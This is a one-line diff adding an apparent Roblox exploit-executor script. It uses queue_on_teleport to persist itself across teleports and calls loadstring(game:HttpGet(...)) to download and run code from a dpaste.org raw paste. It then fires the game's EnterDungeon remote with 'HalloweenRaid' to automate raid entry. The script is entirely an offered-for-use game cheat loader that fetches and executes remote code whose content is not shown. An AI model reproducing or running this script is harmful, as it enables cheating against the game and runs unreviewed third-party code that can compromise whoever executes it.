@@ -1,0 +1,1 @@
+repeat task.wait() until game:IsLoaded() queue_on_teleport([[repeat task.wait() until game:IsLoaded() loadstring(game:HttpGet("https://dpaste.org/wS2T0/raw"))()]]) task.wait(1) local args = {'HalloweenRaid', 1} game:GetService('ReplicatedStorage').Systems.DungeonRaids.EnterDungeon:FireServer(unpack(args))
